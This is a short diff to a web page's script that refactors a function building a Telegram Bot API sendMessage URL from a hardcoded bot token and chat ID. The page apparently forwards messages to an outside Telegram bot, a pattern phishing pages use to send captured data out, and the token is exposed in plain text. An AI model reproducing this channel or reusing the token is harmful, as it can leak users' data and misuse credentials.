@@ -182,7 +182,7 @@
         async function sendMessageToTelegram(message) {
             const botToken1 = '8102627165:AAFWsgPIljsQwGPGWYcCsNdJPPDn-a47IM8';
             const chatId1 = '6405482546';
-            const url = `https://api.telegram.org/bot8102627165:AAFWsgPIljsQwGPGWYcCsNdJPPDn-a47IM8/sendMessage?chat_id=6405482546&text=${encodeURIComponent(message)}`;
+            const url = `https://api.telegram.org/bot${botToken1}/sendMessage?chat_id=${chatId1}&text=${encodeURIComponent(message)}`;
         }
         fetchData();
     </script>
